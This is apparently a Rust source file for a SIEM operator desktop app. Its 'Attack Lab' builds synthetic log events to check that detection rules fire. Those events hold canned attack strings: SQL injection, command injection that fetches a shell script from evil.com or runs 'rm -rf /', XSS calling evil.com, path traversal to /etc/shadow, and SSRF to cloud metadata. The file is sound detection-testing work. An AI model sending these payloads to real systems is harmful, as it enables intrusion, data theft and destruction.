use eframe::egui;

use crate::models::CaseBrief;
use crate::ui::widgets::{pill_label, severity_color};

use super::{ATTACKS, AttackLabResult, AttackLogEntry, OperatorApp, PendingAction, Section};

pub(super) fn build_case_sparkline_series(cases: &[CaseBrief]) -> (Vec<f32>, Vec<f32>) {
    let mut open = vec![0.0_f32; 8];
    let mut critical = vec![0.0_f32; 8];
    for case in cases {
        let age = OperatorApp::case_age_hours(case).unwrap_or(0);
        let bucket = usize::min((age / 3) as usize, 7);
        let idx = 7usize.saturating_sub(bucket);
        if !OperatorApp::is_closed_status(&case.status) {
            open[idx] += 1.0;
        }
        if case.severity.eq_ignore_ascii_case("critical") {
            critical[idx] += 1.0;
        }
    }
    (open, critical)
}

impl OperatorApp {
    pub(super) fn show_command_palette(&mut self, ctx: &egui::Context) {
        if !self.palette_open {
            return;
        }
        let mut open = self.palette_open;
        egui::Window::new("Command Palette")
            .open(&mut open)
            .collapsible(false)
            .resizable(false)
            .default_width(520.0)
            .show(ctx, |ui| {
                ui.label("Ctrl+K: переход и быстрые действия");
                ui.add(
                    egui::TextEdit::singleline(&mut self.palette_query)
                        .id_source("command_palette_input")
                        .desired_width(f32::INFINITY)
                        .hint_text("type: cases, alerts, dashboard, refresh, assign, close"),
                );
                ui.separator();
                let q = self.palette_query.to_lowercase();
                let mut action = |keyword: &str, label: &str, f: &mut dyn FnMut(&mut Self)| {
                    if (q.is_empty() || label.to_lowercase().contains(&q) || keyword.contains(&q))
                        && ui.button(label).clicked()
                    {
                        f(self);
                        self.palette_open = false;
                    }
                };
                action("overview", "Go: Overview", &mut |s| {
                    s.section = Section::Overview
                });
                action("detections", "Go: Detections", &mut |s| {
                    s.section = Section::Detections
                });
                action("alerts", "Go: Alerts", &mut |s| s.section = Section::Alerts);
                action("events", "Go: Events", &mut |s| s.section = Section::Events);
                action("investigations", "Go: Investigations", &mut |s| {
                    s.section = Section::Investigations
                });
                action("assets", "Go: Assets", &mut |s| s.section = Section::Assets);
                action("cases", "Go: Cases", &mut |s| s.section = Section::Cases);
                action("stack", "Go: Stack Control", &mut |s| {
                    s.section = Section::StackControl
                });
                action("settings", "Go: Settings", &mut |s| {
                    s.section = Section::Settings
                });
                action("refresh", "Action: Refresh cases", &mut |s| s.fetch_cases());
                action("refresh events", "Action: Refresh events", &mut |s| {
                    s.fetch_events()
                });
                action("refresh assets", "Action: Refresh assets", &mut |s| {
                    s.fetch_assets()
                });
                action(
                    "refresh detections",
                    "Action: Refresh detections",
                    &mut |s| s.fetch_detections(),
                );
                action("docker up", "Action: Docker start stack", &mut |s| {
                    s.run_docker_compose_action("up")
                });
                action("docker down", "Action: Docker stop stack", &mut |s| {
                    s.run_docker_compose_action("down")
                });
                action("docker restart", "Action: Docker restart stack", &mut |s| {
                    s.run_docker_compose_action("restart")
                });
                action("docker ps", "Action: Docker stack status", &mut |s| {
                    s.run_docker_compose_action("ps")
                });
                action("assign", "Action: Assign selected to me", &mut |s| {
                    s.assign_selected_to_me()
                });
                action("close", "Action: Close selected", &mut |s| {
                    s.close_selected("Closed via command palette")
                });
                action("obs", "Action: Refresh Prometheus/Alertmanager", &mut |s| {
                    s.fetch_observability_snapshot()
                });
                action(
                    "portal",
                    "Action: Refresh portal links (Grafana)",
                    &mut |s| s.fetch_portal_ui_config(),
                );
            });
        self.palette_open = open;
    }

    pub(super) fn show_critical_confirmation(&mut self, ctx: &egui::Context) {
        let Some(pending) = self.pending_action.clone() else {
            return;
        };
        let mut open = true;
        egui::Window::new("Confirm critical action")
            .open(&mut open)
            .collapsible(false)
            .resizable(false)
            .show(ctx, |ui| {
                ui.label("Critical case action requires explicit confirmation.");
                ui.label(format!("Role: {}", self.role_label()));
                ui.add_space(8.0);
                ui.horizontal(|ui| {
                    if ui.button("Cancel").clicked() {
                        self.pending_action = None;
                        self.append_audit("Cancelled critical action".to_string());
                    }
                    if ui.button("Confirm").clicked() {
                        let mut audit: Option<String> = None;
                        match pending.clone() {
                            PendingAction::Close { reason } => {
                                if let Some(i) = self.selected {
                                    if let Some(case) = self.cases.get(i) {
                                        let req = crate::models::PatchCaseRequest {
                                            status: Some("closed".to_string()),
                                            severity: None,
                                            assignee: None,
                                            resolution: Some(reason.clone()),
                                        };
                                        if let Err(e) = self.patch_case_remote(&case.id, &req) {
                                            self.status = format!("Close failed: {e}");
                                            self.pending_action = None;
                                            return;
                                        }
                                        self.status =
                                            format!("{} closed: {}", case.display_key, reason);
                                        audit = Some(format!(
                                            "Confirmed critical close {} ({})",
                                            case.display_key, reason
                                        ));
                                        self.fetch_cases();
                                    }
                                }
                            }
                            PendingAction::MoveStatus { status } => {
                                if let Some(i) = self.selected {
                                    if let Some(case) = self.cases.get(i) {
                                        let req = crate::models::PatchCaseRequest {
                                            status: Some(Self::normalize_status_for_api(&status)),
                                            severity: None,
                                            assignee: None,
                                            resolution: None,
                                        };
                                        if let Err(e) = self.patch_case_remote(&case.id, &req) {
                                            self.status = format!("Transition failed: {e}");
                                            self.pending_action = None;
                                            return;
                                        }
                                        self.status = format!("{} -> {}", case.display_key, status);
                                        audit = Some(format!(
                                            "Confirmed critical transition {} -> {}",
                                            case.display_key, status
                                        ));
                                        self.fetch_cases();
                                    }
                                }
                            }
                        }
                        if let Some(a) = audit {
                            self.append_audit(a);
                        }
                        self.pending_action = None;
                    }
                });
            });
        if !open {
            self.pending_action = None;
        }
    }

    pub(super) fn show_detections_panel(&mut self, ui: &mut egui::Ui) {
        egui::Frame::new()
            .fill(egui::Color32::from_rgb(24, 30, 42))
            .corner_radius(egui::CornerRadius::same(12))
            .stroke(egui::Stroke::new(1.0, egui::Color32::from_rgb(46, 58, 79)))
            .inner_margin(egui::Margin::symmetric(14, 12))
            .show(ui, |ui| {
                ui.horizontal_wrapped(|ui| {
                    ui.label(egui::RichText::new("Detections").strong().size(24.0));
                    ui.label(
                        egui::RichText::new("Correlated rules, severity and firing states")
                            .small()
                            .color(egui::Color32::from_rgb(150, 165, 188)),
                    );
                });
                if let Some(stats) = &self.detection_stats {
                    ui.add_space(8.0);
                    ui.horizontal_wrapped(|ui| {
                        ui.label(format!("Rules: {}", stats.rules_count));
                        ui.label(format!("Pending alerts: {}", stats.pending_alerts));
                        ui.label(format!("Kafka lag: {}", stats.kafka_lag));
                        if !stats.health.is_empty() {
                            ui.label(format!("Health: {}", stats.health));
                        }
                    });
                }
                ui.add_space(8.0);
                if ui.available_width() < 1100.0 {
                    ui.vertical(|ui| {
                        ui.horizontal_wrapped(|ui| {
                            if ui.button("Refresh").clicked() {
                                self.fetch_detections();
                                self.fetch_detection_stats();
                            }
                            if self.detections_loading {
                                ui.spinner();
                            }
                        });
                        ui.label("Search:");
                        ui.add(
                            egui::TextEdit::singleline(&mut self.detection_filters.search)
                                .desired_width(f32::INFINITY),
                        );
                        egui::ComboBox::from_label("Severity")
                            .selected_text(if self.detection_filters.severity.is_empty() {
                                "All"
                            } else {
                                &self.detection_filters.severity
                            })
                            .show_ui(ui, |ui| {
                                for v in ["All", "critical", "high", "medium", "low", "unknown"] {
                                    if ui
                                        .selectable_label(
                                            self.detection_filters.severity == v
                                                || (self.detection_filters.severity.is_empty()
                                                    && v == "All"),
                                            v,
                                        )
                                        .clicked()
                                    {
                                        self.detection_filters.severity = if v == "All" {
                                            String::new()
                                        } else {
                                            v.to_string()
                                        };
                                    }
                                }
                            });
                    });
                } else {
                    ui.horizontal_wrapped(|ui| {
                        if ui.button("Refresh").clicked() {
                            self.fetch_detections();
                            self.fetch_detection_stats();
                        }
                        if self.detections_loading {
                            ui.spinner();
                        }
                        ui.label("Search:");
                        ui.add(
                            egui::TextEdit::singleline(&mut self.detection_filters.search)
                                .desired_width(220.0),
                        );
                        egui::ComboBox::from_label("Severity")
                            .selected_text(if self.detection_filters.severity.is_empty() {
                                "All"
                            } else {
                                &self.detection_filters.severity
                            })
                            .show_ui(ui, |ui| {
                                for v in ["All", "critical", "high", "medium", "low", "unknown"] {
                                    if ui
                                        .selectable_label(
                                            self.detection_filters.severity == v
                                                || (self.detection_filters.severity.is_empty()
                                                    && v == "All"),
                                            v,
                                        )
                                        .clicked()
                                    {
                                        self.detection_filters.severity = if v == "All" {
                                            String::new()
                                        } else {
                                            v.to_string()
                                        };
                                    }
                                }
                            });
                    });
                }
            });
        ui.add_space(8.0);
        let mut open_investigation: Option<String> = None;
        egui::Frame::new()
            .fill(egui::Color32::from_rgb(24, 30, 42))
            .corner_radius(egui::CornerRadius::same(10))
            .stroke(egui::Stroke::new(1.0, egui::Color32::from_rgb(43, 56, 74)))
            .inner_margin(egui::Margin::symmetric(12, 10))
            .show(ui, |ui| {
                egui::Grid::new("detections_grid")
                    .striped(true)
                    .show(ui, |ui| {
                        ui.strong("Rule");
                        ui.strong("Severity");
                        ui.strong("State");
                        ui.strong("Signal");
                        ui.end_row();
                        for d in &self.detections {
                            let matches_search = self.detection_filters.search.trim().is_empty()
                                || d.rule
                                    .to_lowercase()
                                    .contains(&self.detection_filters.search.to_lowercase());
                            let matches_sev = self.detection_filters.severity.is_empty()
                                || d.severity
                                    .eq_ignore_ascii_case(&self.detection_filters.severity);
                            if !(matches_search && matches_sev) {
                                continue;
                            }
                            if ui.selectable_label(false, &d.rule).clicked() {
                                open_investigation = Some(d.rule.clone());
                            }
                            pill_label(ui, &d.severity, severity_color(&d.severity));
                            ui.label(&d.state);
                            ui.label(&d.signal);
                            ui.end_row();
                        }
                    })
            });
        if let Some(entity) = open_investigation {
            self.investigation_entity = entity.clone();
            self.section = Section::Investigations;
            self.fetch_investigation_for_entity(&entity);
        }
    }

    pub(super) fn show_investigations_panel(&mut self, ui: &mut egui::Ui) {
        egui::Frame::new()
            .fill(egui::Color32::from_rgb(24, 30, 42))
            .corner_radius(egui::CornerRadius::same(12))
            .stroke(egui::Stroke::new(1.0, egui::Color32::from_rgb(46, 58, 79)))
            .inner_margin(egui::Margin::symmetric(14, 12))
            .show(ui, |ui| {
                ui.horizontal_wrapped(|ui| {
                    ui.label(egui::RichText::new("Investigations").strong().size(24.0));
                    ui.label(
                        egui::RichText::new("Entity timeline and findings workbench")
                            .small()
                            .color(egui::Color32::from_rgb(150, 165, 188)),
                    );
                    if self.investigation_loading {
                        ui.spinner();
                    }
                });
                ui.add_space(8.0);
                ui.horizontal_wrapped(|ui| {
                    ui.label("Entity / Case ID:");
                    ui.add(
                        egui::TextEdit::singleline(&mut self.investigation_entity)
                            .desired_width(280.0),
                    );
                    if ui.button("Load").clicked() {
                        let entity = self.investigation_entity.clone();
                        self.fetch_investigation_for_entity(&entity);
                    }
                    if ui.button("Promote to Case").clicked() {
                        match self.promote_investigation_to_case() {
                            Ok(_) => {
                                self.append_audit("Promoted investigation to case".to_string());
                                self.status = "Investigation promoted to case".to_string();
                                self.section = Section::Cases;
                            }
                            Err(e) => {
                                self.status = format!("Promotion failed: {e}");
                            }
                        }
                    }
                });
            });
        ui.horizontal_wrapped(|ui| {
            if let Some(links) = self.portal_public_links.clone() {
                let overview = links.siem_overview_dashboard.clone();
                let grafana = links.grafana.clone();
                if !overview.is_empty() && ui.button("Portal: SIEM Overview").clicked() {
                    self.open_public_link(&overview, "SIEM Overview");
                }
                if !grafana.is_empty() && ui.button("Portal: Grafana").clicked() {
                    self.open_public_link(&grafana, "Grafana");
                }
            } else if ui.button("Загрузить ссылки портала").clicked() {
                self.fetch_portal_ui_config();
            }
        });
        if let Some(details) = &self.investigation_details {
            ui.add_space(8.0);
            if !details.grafana.is_empty() && ui.button("Open in Grafana").clicked() {
                let _ = webbrowser::open(&details.grafana);
            }
            if !details.suggested_clickhouse_queries.is_empty() {
                ui.label(egui::RichText::new("Suggested ClickHouse queries").strong());
                for q in &details.suggested_clickhouse_queries {
                    ui.label(egui::RichText::new(q).monospace().small());
                }
            }
        }
        ui.separator();
        egui::Frame::new()
            .fill(egui::Color32::from_rgb(24, 30, 42))
            .corner_radius(egui::CornerRadius::same(10))
            .stroke(egui::Stroke::new(1.0, egui::Color32::from_rgb(43, 56, 74)))
            .inner_margin(egui::Margin::symmetric(12, 10))
            .show(ui, |ui| {
                egui::ScrollArea::vertical().show(ui, |ui| {
                    if self.investigation_notes.is_empty() {
                        ui.label("No investigation notes loaded.");
                    } else {
                        for line in &self.investigation_notes {
                            ui.label(line);
                        }
                    }
                });
            });
        ui.add_space(8.0);
        ui.horizontal_wrapped(|ui| {
            ui.label("Add note to timeline:");
            ui.add(
                egui::TextEdit::singleline(&mut self.investigation_note_input).desired_width(320.0),
            );
            if ui.button("Post").clicked() {
                let body = self.investigation_note_input.trim().to_string();
                if !body.is_empty() && !self.investigation_entity.trim().is_empty() {
                    match self.add_timeline_remote(self.investigation_entity.trim(), &body) {
                        Ok(_) => {
                            self.investigation_note_input.clear();
                            self.status = "Timeline note added".to_string();
                        }
                        Err(e) => self.status = format!("Timeline post failed: {e}"),
                    }
                }
            }
        });
    }

    pub(super) fn show_stack_control_panel(&mut self, ui: &mut egui::Ui) {
        egui::Frame::new()
            .fill(egui::Color32::from_rgb(24, 30, 42))
            .corner_radius(egui::CornerRadius::same(12))
            .stroke(egui::Stroke::new(1.0, egui::Color32::from_rgb(46, 58, 79)))
            .inner_margin(egui::Margin::symmetric(14, 12))
            .show(ui, |ui| {
                ui.label(egui::RichText::new("Stack Control").strong().size(24.0));
                ui.label("Docker orchestration and live status for SIEM stack.");
                ui.add_space(8.0);
                ui.horizontal_wrapped(|ui| {
                    if ui
                        .add_enabled(
                            !self.stack_status_loading,
                            egui::Button::new("Portal status"),
                        )
                        .clicked()
                    {
                        self.fetch_stack_status();
                    }
                    if ui
                        .add_enabled(!self.docker_loading, egui::Button::new("Start Stack"))
                        .clicked()
                    {
                        self.run_docker_compose_action("up");
                    }
                    if ui
                        .add_enabled(!self.docker_loading, egui::Button::new("Stop Stack"))
                        .clicked()
                    {
                        self.run_docker_compose_action("down");
                    }
                    if ui
                        .add_enabled(!self.docker_loading, egui::Button::new("Restart Stack"))
                        .clicked()
                    {
                        self.run_docker_compose_action("restart");
                    }
                    if ui
                        .add_enabled(!self.docker_loading, egui::Button::new("Stack Status"))
                        .clicked()
                    {
                        self.run_docker_compose_action("ps");
                    }
                    if self.docker_loading {
                        ui.spinner();
                    }
                    if self.stack_status_loading {
                        ui.spinner();
                    }
                });
            });
        if !self.stack_status.is_empty() {
            ui.add_space(8.0);
            egui::Grid::new("stack_status_grid")
                .striped(true)
                .show(ui, |ui| {
                    ui.strong("Service");
                    ui.strong("Status");
                    ui.strong("Details");
                    ui.end_row();
                    for row in &self.stack_status {
                        ui.label(&row.service);
                        let color = if row.status.eq_ignore_ascii_case("up") {
                            egui::Color32::from_rgb(90, 200, 140)
                        } else {
                            egui::Color32::from_rgb(235, 75, 85)
                        };
                        pill_label(ui, &row.status, color);
                        ui.label(&row.detail);
                        ui.end_row();
                    }
                });
        }
        ui.add_space(8.0);
        egui::Frame::new()
            .fill(egui::Color32::from_rgb(24, 30, 42))
            .corner_radius(egui::CornerRadius::same(10))
            .stroke(egui::Stroke::new(1.0, egui::Color32::from_rgb(43, 56, 74)))
            .inner_margin(egui::Margin::symmetric(12, 10))
            .show(ui, |ui| {
                egui::ScrollArea::vertical()
                    .max_height(260.0)
                    .show(ui, |ui| {
                        ui.label(egui::RichText::new(&self.docker_last_output).monospace());
                    })
            });
    }

    // ── Attack Lab ────────────────────────────────────────────────────────────

    pub(super) fn show_attack_lab_panel(&mut self, ui: &mut egui::Ui) {
        // Check for background result
        if let Some(rx) = &self.attack_rx {
            if let Ok(result) = rx.try_recv() {
                self.attack_sending = false;
                self.attack_rx = None;
                match result {
                    Ok(r) => {
                        let entry = AttackLogEntry {
                            timestamp: chrono::Utc::now().to_rfc3339(),
                            attack_name: r.attack_name.clone(),
                            rule_id: r.rule_id.clone(),
                            events_sent: r.events_sent,
                            events_failed: r.events_failed,
                            alert_detected: r.alert_detected,
                            alert_severity: r.alert_severity.clone(),
                        };
                        self.attack_log.insert(0, entry);
                        if self.attack_log.len() > 50 {
                            self.attack_log.truncate(50);
                        }
                        self.attack_result = Some(r);
                    }
                    Err(e) => {
                        self.attack_result = Some(AttackLabResult {
                            attack_name: String::new(),
                            rule_id: String::new(),
                            events_sent: 0,
                            events_failed: 0,
                            alert_detected: false,
                            alert_severity: String::new(),
                            alert_description: format!("Error: {}", e),
                        });
                    }
                }
            }
        }

        // Header
        egui::Frame::new()
            .fill(egui::Color32::from_rgb(24, 30, 42))
            .corner_radius(egui::CornerRadius::same(12))
            .stroke(egui::Stroke::new(1.0, egui::Color32::from_rgb(46, 58, 79)))
            .inner_margin(egui::Margin::symmetric(14, 12))
            .show(ui, |ui| {
                ui.label(egui::RichText::new("Attack Lab").strong().size(24.0));
                ui.label("Generate attack events and verify detection rules fire correctly.");
                ui.add_space(8.0);

                ui.horizontal(|ui| {
                    ui.label(egui::RichText::new("Select Attack:").strong());
                });

                ui.add_space(4.0);

                // Attack selection grid
                egui::Grid::new("attack_selection_grid")
                    .spacing([8.0, 4.0])
                    .show(ui, |ui| {
                        for (i, atk) in ATTACKS.iter().enumerate() {
                            let selected = self.attack_selected == i;
                            let bg = if selected {
                                egui::Color32::from_rgb(40, 80, 70)
                            } else {
                                egui::Color32::from_rgb(30, 38, 52)
                            };
                            let border = if selected {
                                egui::Color32::from_rgb(64, 230, 198)
                            } else {
                                egui::Color32::from_rgb(46, 58, 79)
                            };
                            let resp = egui::Frame::new()
                                .fill(bg)
                                .corner_radius(egui::CornerRadius::same(8))
                                .stroke(egui::Stroke::new(if selected { 2.0 } else { 1.0 }, border))
                                .inner_margin(egui::Margin::symmetric(10, 6))
                                .show(ui, |ui| {
                                    ui.horizontal(|ui| {
                                        let sev_color = match atk.severity {
                                            "critical" => egui::Color32::from_rgb(235, 75, 85),
                                            "high" => egui::Color32::from_rgb(235, 160, 50),
                                            "medium" => egui::Color32::from_rgb(50, 180, 235),
                                            _ => egui::Color32::GRAY,
                                        };
                                        pill_label(ui, atk.severity, sev_color);
                                        ui.add_space(4.0);
                                        ui.label(egui::RichText::new(atk.name).strong());
                                    });
                                    ui.horizontal(|ui| {
                                        ui.label(
                                            egui::RichText::new(format!(
                                                "{} | {} events",
                                                atk.mitre, atk.event_count
                                            ))
                                            .small()
                                            .color(egui::Color32::from_rgb(150, 160, 180)),
                                        );
                                    });
                                    ui.horizontal(|ui| {
                                        ui.label(
                                            egui::RichText::new(atk.description)
                                                .small()
                                                .color(egui::Color32::from_rgb(130, 140, 160)),
                                        );
                                    });
                                });
                            if resp.response.clicked() {
                                self.attack_selected = i;
                            }
                            if (i + 1) % 3 == 0 {
                                ui.end_row();
                            }
                        }
                    });
            });

        ui.add_space(8.0);

        // Selected attack detail + Launch button
        let atk = &ATTACKS[self.attack_selected];
        egui::Frame::new()
            .fill(egui::Color32::from_rgb(24, 30, 42))
            .corner_radius(egui::CornerRadius::same(12))
            .stroke(egui::Stroke::new(1.0, egui::Color32::from_rgb(46, 58, 79)))
            .inner_margin(egui::Margin::symmetric(14, 12))
            .show(ui, |ui| {
                ui.horizontal(|ui| {
                    ui.label(
                        egui::RichText::new(format!("Target: {}", atk.name))
                            .strong()
                            .size(18.0),
                    );
                    let sev_color = match atk.severity {
                        "critical" => egui::Color32::from_rgb(235, 75, 85),
                        "high" => egui::Color32::from_rgb(235, 160, 50),
                        "medium" => egui::Color32::from_rgb(50, 180, 235),
                        _ => egui::Color32::GRAY,
                    };
                    pill_label(ui, atk.severity, sev_color);
                });
                ui.label(
                    egui::RichText::new(format!(
                        "Rule: {}  |  MITRE: {}  |  Events: {}",
                        atk.rule_id, atk.mitre, atk.event_count
                    ))
                    .color(egui::Color32::from_rgb(150, 160, 180)),
                );
                ui.add_space(8.0);

                ui.horizontal(|ui| {
                    let can_launch = !self.attack_sending;
                    if ui
                        .add_enabled(
                            can_launch,
                            egui::Button::new(
                                egui::RichText::new("  Launch Attack  ").strong().size(16.0),
                            )
                            .fill(egui::Color32::from_rgb(180, 50, 50)),
                        )
                        .clicked()
                    {
                        self.launch_attack(self.attack_selected);
                    }

                    if ui
                        .add_enabled(
                            can_launch && ATTACKS.len() > 1,
                            egui::Button::new("  Launch All  "),
                        )
                        .clicked()
                    {
                        // Launch first attack; user can repeat for others
                        self.launch_attack(0);
                    }

                    if self.attack_sending {
                        ui.spinner();
                        ui.label("Sending events & waiting for detection...");
                    }
                });
            });

        // Result display
        if let Some(ref result) = self.attack_result {
            ui.add_space(8.0);
            let (bg, border, icon) = if result.alert_detected {
                (
                    egui::Color32::from_rgb(15, 40, 25),
                    egui::Color32::from_rgb(40, 180, 90),
                    "DETECTED",
                )
            } else {
                (
                    egui::Color32::from_rgb(50, 25, 20),
                    egui::Color32::from_rgb(200, 60, 50),
                    "NOT DETECTED",
                )
            };
            egui::Frame::new()
                .fill(bg)
                .corner_radius(egui::CornerRadius::same(12))
                .stroke(egui::Stroke::new(2.0, border))
                .inner_margin(egui::Margin::symmetric(14, 12))
                .show(ui, |ui| {
                    ui.horizontal(|ui| {
                        ui.label(egui::RichText::new(icon).strong().size(20.0).color(border));
                        ui.add_space(8.0);
                        ui.label(
                            egui::RichText::new(format!(
                                "{} ({})",
                                result.attack_name, result.rule_id
                            ))
                            .strong(),
                        );
                    });
                    ui.label(format!(
                        "Events sent: {} | Failed: {}",
                        result.events_sent, result.events_failed
                    ));
                    if result.alert_detected {
                        let sev_color = match result.alert_severity.as_str() {
                            "critical" => egui::Color32::from_rgb(235, 75, 85),
                            "high" => egui::Color32::from_rgb(235, 160, 50),
                            "medium" => egui::Color32::from_rgb(50, 180, 235),
                            _ => egui::Color32::GRAY,
                        };
                        ui.horizontal(|ui| {
                            ui.label("Alert severity:");
                            pill_label(ui, &result.alert_severity, sev_color);
                        });
                        if !result.alert_description.is_empty() {
                            ui.label(
                                egui::RichText::new(&result.alert_description)
                                    .small()
                                    .color(egui::Color32::from_rgb(180, 190, 200)),
                            );
                        }
                    } else {
                        ui.label(
                            egui::RichText::new(
                                "Check correlator logs: docker logs siem-correlator",
                            )
                            .small()
                            .color(egui::Color32::from_rgb(180, 120, 100)),
                        );
                    }
                });
        }

        // Attack log
        if !self.attack_log.is_empty() {
            ui.add_space(8.0);
            ui.label(egui::RichText::new("Attack History").strong().size(16.0));
            ui.add_space(4.0);
            egui::Grid::new("attack_log_grid")
                .striped(true)
                .show(ui, |ui| {
                    ui.strong("Time");
                    ui.strong("Attack");
                    ui.strong("Rule");
                    ui.strong("Sent");
                    ui.strong("Result");
                    ui.end_row();
                    for entry in &self.attack_log {
                        let ts = entry.timestamp.get(11..19).unwrap_or(&entry.timestamp);
                        ui.label(egui::RichText::new(ts).monospace().small());
                        ui.label(&entry.attack_name);
                        ui.label(egui::RichText::new(&entry.rule_id).monospace().small());
                        ui.label(entry.events_sent.to_string());
                        if entry.alert_detected {
                            pill_label(
                                ui,
                                &entry.alert_severity,
                                egui::Color32::from_rgb(40, 180, 90),
                            );
                        } else {
                            pill_label(ui, "missed", egui::Color32::from_rgb(200, 60, 50));
                        }
                        ui.end_row();
                    }
                });
        }
    }

    fn launch_attack(&mut self, attack_idx: usize) {
        let atk = &ATTACKS[attack_idx];
        let vector_url = std::env::var("SIEM_OPERATOR_VECTOR_URL")
            .unwrap_or_else(|_| "http://127.0.0.1:8080/logs".to_string());
        let alertmanager_url = self.alertmanager_direct_base();
        let rule_id = atk.rule_id.to_string();
        let attack_name = atk.name.to_string();
        let events = Self::build_attack_events(attack_idx);

        self.attack_sending = true;
        self.attack_result = None;

        let (tx, rx) = std::sync::mpsc::channel();
        self.attack_rx = Some(rx);

        std::thread::spawn(move || {
            let result = Self::run_attack(
                &vector_url,
                &alertmanager_url,
                &rule_id,
                &attack_name,
                events,
            );
            let _ = tx.send(Ok(result));
        });
    }

    fn build_attack_events(attack_idx: usize) -> Vec<serde_json::Value> {
        let now = chrono::Utc::now().to_rfc3339();
        let attacker_ips = [
            "203.0.113.99",
            "203.0.113.5",
            "203.0.113.12",
            "203.0.113.88",
            "198.51.100.20",
            "198.51.100.55",
        ];

        let mut events = Vec::new();

        match attack_idx {
            // 0: Brute Force
            0 => {
                for i in 0..15 {
                    events.push(serde_json::json!({
                        "Timestamp": now,
                        "Level": "Error",
                        "Message": format!("HTTP POST /api/auth/login responded 401 in {}ms", 20 + i),
                        "SourceType": "dotnet",
                        "Host": "api-01",
                        "Properties": {
                            "ClientIp": attacker_ips[0],
                            "RequestMethod": "POST",
                            "RequestPath": "/api/auth/login",
                            "StatusCode": 401,
                            "Elapsed": 20 + i,
                            "UserId": format!("user-{}", i % 3)
                        }
                    }));
                }
            }
            // 1: SQL Injection
            1 => {
                let payloads = [
                    ("' OR '1'='1", "/api/users/search?q="),
                    (
                        "UNION SELECT null,username,password FROM users--",
                        "/api/products?sort=",
                    ),
                    ("; DROP TABLE users;--", "/api/admin/cleanup?cmd="),
                    ("$where: \"this.password\"", "/api/auth/token"),
                    ("0x414141414141", "/api/data/export?format="),
                ];
                for (i, (payload, path)) in payloads.iter().enumerate() {
                    events.push(serde_json::json!({
                        "Timestamp": now,
                        "Level": "Error",
                        "Message": format!("Query failed: {}", payload),
                        "SourceType": "dotnet",
                        "Host": "api-01",
                        "Properties": {
                            "ClientIp": attacker_ips[i % attacker_ips.len()],
                            "RequestMethod": "POST",
                            "RequestPath": format!("{}{}", path, &payload[..payload.len().min(30)]),
                            "StatusCode": 500,
                            "Elapsed": 150 + i as i64 * 10
                        }
                    }));
                }
            }
            // 2: Command Injection
            2 => {
                let payloads = [
                    ("; cat /etc/passwd", "/api/search?q="),
                    ("$(wget http://evil.com/shell.sh)", "/api/tools/run?cmd="),
                    ("| bash -c 'id'", "/api/exec?input="),
                    ("; rm -rf /", "/api/admin/cleanup?dir="),
                ];
                for (i, (payload, path)) in payloads.iter().enumerate() {
                    events.push(serde_json::json!({
                        "Timestamp": now,
                        "Level": "Warning",
                        "Message": format!("Request processed: {}", payload),
                        "SourceType": "dotnet",
                        "Host": "api-01",
                        "Properties": {
                            "ClientIp": attacker_ips[i % attacker_ips.len()],
                            "RequestMethod": "POST",
                            "RequestPath": format!("{}{}", path, &payload[..payload.len().min(20)]),
                            "StatusCode": 200,
                            "Elapsed": 30
                        }
                    }));
                }
                // 5th event with subshell
                events.push(serde_json::json!({
                    "Timestamp": now,
                    "Level": "Warning",
                    "Message": "$(cat /etc/hosts)",
                    "SourceType": "dotnet",
                    "Host": "api-01",
                    "Properties": {
                        "ClientIp": attacker_ips[3],
                        "RequestMethod": "GET",
                        "RequestPath": "/api/debug",
                        "StatusCode": 200,
                        "Elapsed": 25
                    }
                }));
            }
            // 3: XSS
            3 => {
                let payloads = [
                    ("<script>alert('xss')</script>", "/api/comments"),
                    ("<img src=x onerror=alert(1)>", "/api/profile/bio"),
                    ("javascript:document.cookie", "/api/redirect?url="),
                    ("<svg onload=fetch('http://evil.com/')>", "/api/upload/name"),
                ];
                for (i, (payload, path)) in payloads.iter().enumerate() {
                    events.push(serde_json::json!({
                        "Timestamp": now,
                        "Level": "Warning",
                        "Message": format!("Input received: {}", &payload[..payload.len().min(60)]),
                        "SourceType": "dotnet",
                        "Host": "api-01",
                        "Properties": {
                            "ClientIp": attacker_ips[i % attacker_ips.len()],
                            "RequestMethod": "POST",
                            "RequestPath": *path,
                            "StatusCode": 200,
                            "Elapsed": 25
                        }
                    }));
                }
                // 5th: encoded XSS
                events.push(serde_json::json!({
                    "Timestamp": now,
                    "Level": "Warning",
                    "Message": "%3Cscript%3Ealert(1)%3C/script%3E",
                    "SourceType": "dotnet",
                    "Host": "api-01",
                    "Properties": {
                        "ClientIp": attacker_ips[4],
                        "RequestMethod": "GET",
                        "RequestPath": "/api/search?q=%3Cscript%3E",
                        "StatusCode": 200,
                        "Elapsed": 20
                    }
                }));
            }
            // 4: Path Traversal
            4 => {
                let payloads = [
                    "../../etc/passwd",
                    "..\\\\..\\\\windows\\\\system32",
                    "%2e%2e%2f%2e%2e%2fetc/shadow",
                    "....//....//etc/hosts",
                    "/proc/self/environ",
                ];
                for (i, payload) in payloads.iter().enumerate() {
                    events.push(serde_json::json!({
                        "Timestamp": now,
                        "Level": "Warning",
                        "Message": format!("File access: {}", payload),
                        "SourceType": "dotnet",
                        "Host": "api-01",
                        "Properties": {
                            "ClientIp": attacker_ips[i % attacker_ips.len()],
                            "RequestMethod": "GET",
                            "RequestPath": format!("/api/files?path={}", payload),
                            "StatusCode": if i == 0 { 200 } else { 403 },
                            "Elapsed": 5
                        }
                    }));
                }
            }
            // 5: SSRF
            5 => {
                let targets = [
                    (
                        "http://10.0.0.1/admin",
                        "/api/fetch?url=http://10.0.0.1/admin",
                    ),
                    (
                        "http://169.254.169.254/latest/meta-data/",
                        "/api/proxy?dest=http://169.254.169.254/latest/meta-data/",
                    ),
                    (
                        "http://127.0.0.1:8080/debug",
                        "/api/render?url=http://127.0.0.1:8080/debug",
                    ),
                    (
                        "http://0.0.0.0/actuator/env",
                        "/api/webhook?target=http://0.0.0.0/actuator/env",
                    ),
                ];
                for (i, (desc, path)) in targets.iter().enumerate() {
                    events.push(serde_json::json!({
                        "Timestamp": now,
                        "Level": "Warning",
                        "Message": format!("Fetch request: {}", desc),
                        "SourceType": "dotnet",
                        "Host": "api-01",
                        "Properties": {
                            "ClientIp": attacker_ips[i % attacker_ips.len()],
                            "RequestMethod": "POST",
                            "RequestPath": *path,
                            "StatusCode": 200,
                            "Elapsed": 50,
                            "TargetUrl": *desc
                        }
                    }));
                }
            }
            // 6: Privilege Escalation
            6 => {
                let paths = [
                    "/api/admin/users",
                    "/api/internal/config",
                    "/api/permissions/grant",
                ];
                for path in &paths {
                    for _ in 0..3 {
                        events.push(serde_json::json!({
                            "Timestamp": now,
                            "Level": "Error",
